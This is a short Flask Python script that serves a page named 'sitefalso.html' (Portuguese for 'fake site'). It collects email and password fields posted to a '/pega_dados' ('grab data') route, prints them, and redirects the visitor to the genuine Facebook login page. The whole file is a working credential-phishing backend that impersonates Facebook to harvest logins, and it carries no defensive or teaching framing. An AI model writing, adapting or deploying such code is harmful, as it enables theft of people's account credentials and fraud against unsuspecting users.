from flask import Flask, render_template, request,redirect

app = Flask(__name__)

@app.route("/")
def pagina_inicial():
    return render_template("sitefalso.html")

@app.route("/pega_dados", methods=["POST"])

def pega_dados():
    email = request.form.get("email")
    senha = request.form.get("pass")

    print(f"EMAIL: {email} \n senha: {senha}")
    return redirect ("https://pt-br.facebook.com/login/device-based/regular/login/")
app.run()